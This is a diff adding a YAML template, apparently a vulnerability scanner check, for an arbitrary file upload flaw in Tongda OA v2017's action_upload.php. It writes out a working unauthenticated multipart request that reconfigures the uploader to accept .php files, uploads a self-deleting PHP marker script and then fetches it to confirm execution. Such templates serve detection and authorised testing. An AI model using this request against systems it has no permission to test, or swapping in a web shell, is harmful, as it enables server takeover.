@@ -1,0 +1,66 @@
+id: tongda-action-uploadfile
+brief:
+    title: Tongda OA v2017 action_upload - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities
+    label:
+        - tongda
+        - fileupload
+        - intrusive
+        - router
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/module/ueditor/php/action_upload.php?action=uploadfile'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjhddzlqp
+      body: |-
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ffff
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        {{randstr}}
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="ffff"; filename="test.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        ------WebKitFormBoundaryjhddzlqp--
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}{{randstr}}.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
